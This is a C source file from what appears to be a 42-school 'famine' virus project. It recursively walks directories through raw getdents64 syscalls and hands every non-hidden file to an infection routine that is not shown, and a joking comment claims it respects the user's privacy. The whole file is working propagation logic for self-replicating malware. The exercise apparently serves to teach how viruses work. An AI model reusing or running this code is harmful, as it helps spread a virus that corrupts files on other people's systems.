/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   file_iterator.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:14 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/12 18:03:37 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <limits.h>
#include "famine.h"
#include "infect.h"
#include "utils.h"
#include "syscall.h"

static void	infect_files_at(char path[PATH_MAX], char *path_end, uint64_t seed[2]);

static void	browse_dirent(char path[PATH_MAX], char *path_end, \
			const char buff[1024], int nread, uint64_t seed[2])
{
	for (int bpos = 0; bpos < nread;)
	{
		struct dirent64 *file = (struct dirent64*)(buff + bpos);

		ft_strcpy(path_end, file->d_name);
		if (file->d_name[0] != '.') // we respect your privacy ;)
		{
			if (file->d_type == DT_DIR)
				infect_files_at(path, path_end + ft_strlen(file->d_name), seed);
			else
				infect_if_candidate(path, seed);
		}
		bpos += file->d_reclen;
	}
}

static void	infect_files_at(char path[PATH_MAX], char *path_end, uint64_t seed[2])
{
	char		buff[1024];
	int		fd = famine_open(path, O_RDONLY);
	int		nread;

	if (fd == -1) return;

	*path_end++ = '/';
	while ((nread = famine_getdents64(fd, (void*)buff, 1024)) > 0)
		browse_dirent(path, path_end, buff, nread, seed);
	famine_close(fd);
}

inline void		infect_files_in(const char *root_dir, uint64_t seed[2])
{
	char	path[PATH_MAX];

	ft_strcpy(path, root_dir);
	infect_files_at(path, path + ft_strlen(root_dir), seed);
}
